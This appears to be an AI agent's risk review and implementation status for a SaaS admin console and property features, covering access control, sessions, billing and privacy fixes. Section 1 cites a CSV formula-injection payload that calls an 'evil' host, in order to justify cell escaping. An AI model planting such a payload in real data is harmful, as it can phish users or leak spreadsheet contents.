# Admin console and property phase: risk review for approval

Date: 13 Oct 2026. Covers the outstanding items from the admin console (super admin) phase and the property phase, and the
20 rulings recorded in `.superpowers/sdd/2026-10-13-super-admin/progress.md` (an earlier message said 28; the ledger has 20).

Classes:
- **Blocker**: fix before this phase closes.
- **Next release**: high priority, scheduled for the next release.
- **Accepted**: documented limitation, monitored.

## 1. Security and access control

| Item | What can go wrong today | Proposed fix | Class |
|---|---|---|---|
| Spreadsheet formula injection in payments CSV | A business named `=HYPERLINK("http://evil",…)` runs a formula when Finance opens the export in Excel. That can phish or leak data from the sheet. | Prefix any cell starting with `= + - @`, tab or CR with `'`. Apply this to every text column, not just the business name. | Blocker |
| Suspension across servers | Each API server caches business status for up to 1 minute, so a suspended business keeps working on other servers for up to a minute. | Drop the cross-request cache: check status on every business request (one primary-key lookup, about 0.1 ms). This gives the same answer on every server immediately. | Blocker |
| Last-super-admin race | Two super admins removing or demoting each other at the same instant can both succeed. The console is then locked out and the config email can't re-bootstrap. | Take a Postgres transaction-level advisory lock around the "is there another super admin" check and the write. | Blocker |
| Suspended business accepts team invitations | An invitation link still creates a membership and signs the person in. The next request is blocked, but the membership exists. | Refuse to accept invitations for a business that isn't Active. Also refuse to create invitations. | Blocker |
| Staff calendar feeds (ICS) of a suspended business | The feed keeps serving appointments and customer names to calendar apps. | Return 404 while the business is suspended. | Blocker |
| Customer-owned pages of a suspended business (order tracking, manage-booking link) | End customers who already paid can still see their order or booking. Rescheduling and cancelling still work too. | Keep read access, because these customers did nothing wrong. Block reschedule and cancel with "This business is currently unavailable. Contact them directly." | Blocker (writes) / Accepted (reads) |

## 2. Authentication and session management

| Item | What can go wrong today | Proposed fix | Class |
|---|---|---|---|
| No forgot-password or reset in any product | Anyone who forgets their password can only sign in with an emailed code and can never set a new password. Support has no reset tool. | Build a full forgot/reset/change-password flow in all six apps (design in section 7). | Blocker |
| "Sign out everywhere" leaves admin-console sessions running | Admin tokens are 8-hour signed tokens with no server-side check, so a stolen or forgotten admin session survives sign-out, password reset and offboarding. | Put the user's security stamp in admin tokens and check it on every admin request; the role check already reads the database. Sign out everywhere, password reset and admin removal change the stamp, so sessions end on the next request. | Blocker |
| Token revocation during suspension isn't atomic | Refresh tokens are revoked by a separate statement before the status change is saved. If the save fails, tokens are revoked but the business stays Active. | Do both in one database transaction. | Blocker |
| Customer access tokens after sign-out or password reset | A customer access token keeps working for up to 15 minutes after sign-out everywhere or a password reset. Refresh tokens are revoked at once. | Accept: short-lived by design. Checking the stamp on every customer request adds a database read per request. | Accepted |
| Admin and customer sign-in share the lockout counter | Five bad customer-login attempts against an admin's email lock that admin out of the console for 10 minutes (a denial-of-service lever). | Separate counter for admin sign-in, or a per-IP-only throttle on the customer side for admin accounts. | Next release |

## 3. Financial and subscription integrity

| Item | Implication today | Proposed fix | Class |
|---|---|---|---|
| Plan limits change immediately for paid businesses | Lowering a limit mid-period takes away what a business already paid for. For example, 30 listings becomes 10: listings stay live but can't be renewed or added. Raising one gives it free. Only price waits for renewal. | Snapshot price, limits and features onto the subscription when it's paid or comped. The business gets the snapshot until renewal, and edits apply at the next renewal. The console says so. | Blocker |
| Subscribers on a hidden plan can't renew | Checkout refuses hidden plans, so a "grandfathered" customer is forced onto another plan at period end. | Allow checkout of a hidden plan for a business whose current or last subscription is that plan. | Blocker |
| MRR uses current list prices and adds currencies together | Editing a price changes reported MRR at once even though nobody pays the new price yet. Mixed currencies would be summed. | Compute MRR from the snapshot price on each subscription, and report MRR per currency. | Blocker |
| Payments list and CSV cap at 2,000 rows per source | Long-range exports silently miss older payments, so a finance report can look complete when it isn't. | One SQL `UNION ALL` query with real paging, so exports are complete. | Blocker |
| Comps excluded from MRR and "paying" counts | Comps are not revenue. | Keep. Show comps as their own count on the overview. | Accepted |

## 4. Administration and support

| Item | Implication | Proposed fix | Class |
|---|---|---|---|
| No startup bootstrap of admins | There is a bootstrap: a config email becomes super admin only after signing in to the console with the emailed code, which proves the mailbox. A startup pass would reintroduce the squatting risk the review found. The real gap is recovery: if every super admin is lost (or a config admin was removed in the panel), nobody can get back in without SQL. | A break-glass command run on the server: `dotnet Saas.Api.dll admin grant <email> SuperAdmin`, audited. Using it needs server access, which is the right bar. | Next release |
| No early "end view-as" | When support closes the view, the read-only token still works in that tab for up to 30 minutes, and Account activity can't say when the view really ended. | Record view-as sessions server-side. "End view" (banner and console) ends the session, every request with a view-as token checks it's still open, and Account activity shows the real end time. | Blocker |
| No admin "me" endpoint | After a role change the console keeps showing old menus until a 403. The API enforces the new role either way. | `GET /api/platform/me`, called on load and every few minutes. | Blocker |
| No admin sign-out endpoint | Signing out only forgets the token in that browser tab; the token stays valid until it expires. | `POST /api/platform/auth/logout` ends that session (session table, as with view-as). | Blocker |
| 403s don't name the missing role | Operators see a generic "You do not have access". | Name the role in the API message ("You need the Finance role for this."). | Next release |

## 5. Data privacy and auditability

| Item | Today | Proposed fix | Class |
|---|---|---|---|
| Finance sees member emails and can search by owner phone | More customer personal data than Finance needs. | Finance sees member names and roles. Emails, phones and phone search are for Support and Super admin only. | Blocker |
| Health page shows failed-email addresses to every role | Moderators and Finance see customer email addresses. | Mask as `a…@domain.com` for everyone except Support and Super admin. | Blocker |
| Audit rows have no business name | Reviewers see a business id, not a name. | Add the business name (and product) to audit rows and filters. | Blocker |
| Business detail shows payouts' bank account numbers to Support | Support doesn't need full account numbers. | Show the last 4 digits to everyone except Finance and Super admin. | Next release |

## 6. Remaining items

### From the admin console phase

| Item | Class | Note |
|---|---|---|
| Moderation queue shows only a listing's cover photo and no public link | Next release | Moderators can't see every photo before approving |
| Rate limiter on admin routes has no automated test | Next release | Add a test with a low configured limit |
| Role-by-route table test (only spot checks today) | Next release | Every route × every role |
| Console buttons not clicked in a browser (window was hidden) | Blocker | A real click-through before release, with the app window visible |

### From the property phase

| Item | Class | Note |
|---|---|---|
| Staff and Accountant can read the agency's bank account number and earnings | Blocker | Least privilege: Owner and Admin only |
| Double-clicked stay cancellation can refund twice | Blocker | Conditional status update so only one refund is issued |
| Failed photos keep their original upload (with GPS location) | Blocker | Privacy; delete the original on failure too |
| Originals stored with the uploader's content type | Blocker | Store with the type detected from the file |
| `bbox=NaN` passes validation and returns 500 | Next release | Reject non-finite numbers |
| Wrong-amount stay payment is only logged | Next release | Alert Finance and email the guest |
| Late-payment auto-refund sends no email to the guest | Next release | Email the guest |
| Reporter IP hash is unsalted; two identical reports at once give 500 | Next release | HMAC with a server key; return 409 |
| No length limits on stay/viewing phone and notes | Next release | Validation |
| Two boosts confirming at the same moment can lose days | Next release | Conditional update on the listing |
| Hidden listings don't count toward the plan; reactivation skips the limit check | Next release | Count them; check on reactivation |
| Renew page auto-renews on page load and shows a raw error for a bad link | Next release | Confirm button; friendly expired-link page |
| Call button text overflows at about 800 px | Accepted | Cosmetic |
| Map pins carry no listing link | Next release | Add slugs to pins |
| Unknown listing pages return 200 with `noindex` (soft 404) | Accepted | Framework limitation; `noindex` keeps them out of search |

## 7. Password reset design (for approval)

- **API (shared core):**
  - `POST /api/auth/password/forgot { email, product? }`
    - Always returns 204, so it never reveals whether an account exists.
    - Rate limited, with at most 3 emails per hour per address.
    - Emails a link to the right app: the product's web app, or the admin console for admins.
  - `POST /api/auth/password/reset { email, token, newPassword }`
    - Uses ASP.NET Identity's reset token, valid for 1 hour and single use, because the security stamp changes on reset.
    - On success it sets the password, unlocks the account and revokes every refresh token. It also changes the security stamp, which ends admin-console sessions.
    - It writes an audit entry and emails a "your password was changed" notice.
  - `POST /api/auth/password/change { currentPassword, newPassword }` for signed-in users. It applies the same session revocation, except for the current session.
  - The link carries the token in the URL fragment (`/reset-password#email=…&token=…`), so it never reaches server logs.
- **Support:** "Send password reset email" in the console. The existing "send sign-in code" stays.
- **All six web apps:**
  - "Forgot password?" on every sign-in page, plus `/forgot-password` and `/reset-password` pages.
  - "Change password" in account settings.
- **Tests:**
  - A reset token works once and expires.
  - A reset ends refresh tokens and admin sessions.
  - Forgot-password reveals nothing about which emails have accounts.
  - Change-password needs the current password.

## 8. The 20 recorded decisions

Recommendation key:
- **Approve**: keep as is.
- **Superseded**: already changed by a later fix.
- **Revisit**: changed by a fix proposed above.
- **Decide**: a business call for you.

| # | Decision | Why it was made | Impact and cost if wrong | Recommendation |
|---|---|---|---|---|
| 1 | No worktree or commits; all work stays uncommitted | Repo has zero commits and no branch was chosen | No history or rollback point; everything lands as one large commit | **Decide**: commit to a branch now |
| 2 | Executed the plan without a separate plan-review stop | You said "proceed with development" after the spec | Plan details you might have changed went unreviewed | **Approve** (retrospectively) or ask for plan reviews in future |
| 3 | Lazy admin bootstrap at token issue | Admins can sign up after startup | It allowed admin-email squatting | **Superseded**: bootstrap now happens only after the emailed console code |
| 4 | Admin role checked in the database on every request | Removed admins and role changes must take effect at once | One indexed query per admin request | **Approve** |
| 5 | Admin sign-in reuses Identity lockout and the OTP table | Proven code; one lockout policy | Shared lockout lets customer-login attempts lock an admin out (section 2) | **Approve**, with the lockout fix next release |
| 6 | Six background jobs record runs in `job_runs` (email every 3 s) | Health page needs last-run times | About 20 small writes a minute | **Approve** |
| 7 | 1-minute business-status cache; other servers may lag | Avoid a lookup per request | Suspended business keeps access for up to a minute on other servers | **Revisit**: check on every request (section 1) |
| 8 | "Send reset" sends a sign-in code (no reset flow) | No reset flow existed | Users can't set a new password | **Superseded** by the reset flow (section 7) |
| 9 | Sign-in for a suspended business says it is suspended | The old message wrongly said "no account" | Reveals suspension to someone who knows the password | **Approve** |
| 10 | View-as acts as the owner; GET routes with lazy side effects may create rows | The product apps behave exactly as for the owner | An invisible lazily created row (for example an agent profile) | **Approve** |
| 11 | Support may view a suspended business | Investigating suspended businesses is the main use | None: read only, audited | **Approve** |
| 12 | View-as token in the URL fragment; ends only at 30 minutes | Keeps the token out of logs; no session table | Token usable for up to 30 minutes after support stops | **Revisit**: server-side sessions with early end (section 4) |
| 13 | Startup seeder only inserts missing plans | It overwrote console edits on every start | Plan changes in code no longer reach existing databases | **Approve**: plans are managed in the console; document it |
| 14 | Comps excluded from MRR and paying counts | Comps aren't revenue | None | **Approve** |
| 15 | Payments list merges four sources in memory, 2,000 rows each | Simple; fine at current volume | Exports can silently miss old payments | **Revisit**: complete SQL export (section 3) |
| 16 | Last-super-admin check without a lock | Rare race | Lockout recoverable only by SQL | **Revisit**: advisory lock (section 1) |
| 17 | Console actions exercised through the API, not by clicking | App window was hidden | A miswired button could ship | **Revisit**: real click-through before release |
| 18 | No automated test for the admin rate limiter | Shared test setup raises limits | A broken limiter could go unnoticed | **Approve** for now; test next release |
| 19 | Customer-token sweep instead of a full role-by-route table | The sweep plus role spot checks cover the main risk | A route gated to the wrong role could slip through | **Approve** for now; full table next release |
| 20 | Learners of a suspended course business keep their lessons | They paid; only new sales and browsing stop | A fraudulent school's content stays visible to its existing learners | **Decide**: keep access, or block and refund via support |

## Proposed order of work for the blockers

1. Password reset and change across all apps (section 7), including the security stamp in admin sessions.
2. Server-side sessions: view-as with early end, admin sign-out, `GET /api/platform/me`.
3. Suspension: per-request status check, atomic revocation, invitations, ICS feeds, customer-page writes.
4. Subscription snapshots: limits and price at payment; hidden-plan renewal; MRR per currency from snapshots.
5. Complete SQL payments export with CSV formula escaping.
6. Privacy: finance and health masking, business names in audit, property money routes for Owner/Admin only, photo originals.
7. Last-super-admin lock and double-cancel guard.
8. Full test suite, a fresh review, and a real click-through of the console with the window visible.

## Approval (13 Oct 2026)

- Classification approved as written; all Blocker items to be implemented now, in the proposed order.
- Decision 20: learners of a suspended course business keep access to what they paid for (support refunds case by case).
- Decision 1: work stays uncommitted for now.

## Implementation status (13 Oct 2026)

Backend changes are in `api/`, recorded in `.superpowers/sdd/2026-10-13-blockers/progress.md` (groups 1–6, suite 264/264).
API contracts: `docs/PLATFORM_API.md`, `docs/API.md`, `docs/PROPERTY_API.md`.

- Done (backend), group 1: forgot/reset/change password API; server-side sessions (`auth_sessions`) for admin-panel and support-view
  tokens instead of a security-stamp claim; admin sign-out; `GET /api/platform/me`; early end of support views; sign out everywhere,
  password reset/change and admin removal end console sessions; support "send password reset".
- Done (backend), group 2: per-request status check (no cache); suspension and refresh-token revocation in one transaction;
  invitations refused; staff calendar feeds 404; customer cancel, reschedule and deposit payment refused with 409.
- Done (backend), group 3: subscription snapshots (price, currency, limits, features); hidden-plan renewal; MRR per currency from
  snapshot prices.
- Done (backend), group 4: complete `UNION ALL` payments list and CSV; CSV formula escaping.
- Done (backend), group 5: contact details for Support and SuperAdmin only; masked failed-email recipients; business name and product
  on audit rows, with a product filter; property earnings, payouts and payout account for Owner/Admin only; photo originals stored with
  the sniffed content type and deleted on failure.
- Done (backend), group 6: last-super-admin advisory lock; double stay cancellation refunds once.
- Done (frontend): password pages and "Change password" in all six apps (business side; course learners and property seekers have
  no settings page yet, so they use "Forgot password?"); console sign-out, `me` polling, "Send password reset email" and "End view";
  the support banner's "End view" calling the API; Account activity end times; plan panel wording.
- Done, step 8: fresh review. Its Important findings were fixed, each with a test:
  - support views end with the admin's other sessions;
  - raw audit data is hidden from Finance;
  - course money is Owner/Admin only;
  - pending-stay cancel and payment confirmation can't overwrite each other.
  Also fixed:
  - comped hidden plans can be renewed;
  - support is told when the reset-email limit stops a send;
  - ending a view by id only ends support views;
  - deleting a listing deletes its photos;
  - invoice CSV escapes tab and CR;
  - business detail shows the price paid;
  - health masks addresses in error text;
  - admins' reset links go to the console.
  Suite 277/277.
- Done, step 8: console click-through in the browser pane:
  - forgot password, then reset, then sign-in with code;
  - overview MRR;
  - audit business names and product filter;
  - view-as, then the banner's "End view", ending the session server-side;
  - account page;
  - sign-out ending the session server-side.
- Deferred (minor):
  - a successful photo is marked failed if deleting its original throws;
  - a missing email on forgot/reset gives a 500;
  - staff calendar feed tokens appear in raw audit JSON, which Support can see;
  - no change-password page for learners and seekers.
- User decisions (13 Oct 2026, after the blockers):
  - the work stays uncommitted;
  - rulings approved: hidden plans reopen for any past subscriber; an admin's password change ends the current console tab;
    support-sent admin resets go to the console; existing subscribers' revenue counts at list price until renewal; the I4 race fix
    verified by reasoning; the refund runbook check;
  - accepted: staff calendar feed tokens in raw audit JSON (Support can see them);
  - fixed now: change password for course learners (`/learn/account`) and property seekers (`/me/account`); photos Ready only once the
    original is deleted (otherwise they stay Processing and retry); a missing email (or token or password) on forgot/reset/change
    gives a 400 field error; reset links last 10 minutes, and the apps say so.
- Done, 13 Oct 2026, at the user's request: every "Next release" item above.
  - Separate console sign-in lockout (5 failures, 10 minutes), independent of customer lockout.
  - Break-glass `dotnet Saas.Api.dll admin grant <email> <role>`, audited as `admin.grant_cli`.
  - 403s name the role needed ("You need the Finance role for this.").
  - Bank account numbers masked as `••••1234` in support views.
  - Moderation items carry every photo and the public link.
  - Rate-limiter test on admin routes, and a role-by-route table test covering every admin route and role (it found a 500 on
    `POST /api/platform/admins` with no email, now a 400).
  - Property: non-finite `bbox` refused; wrong-amount stay payments email the guest and Finance; late and cancelled-before-payment
    refunds email the guest; reporter IPs stored as an HMAC and simultaneous duplicate reports give 409; phone and notes length
    limits; concurrent boosts both add their days; hidden listings count toward the plan and approval over the limit gives 409;
    the renew page previews and asks before renewing, with a friendly expired-link page; map pins carry slugs.
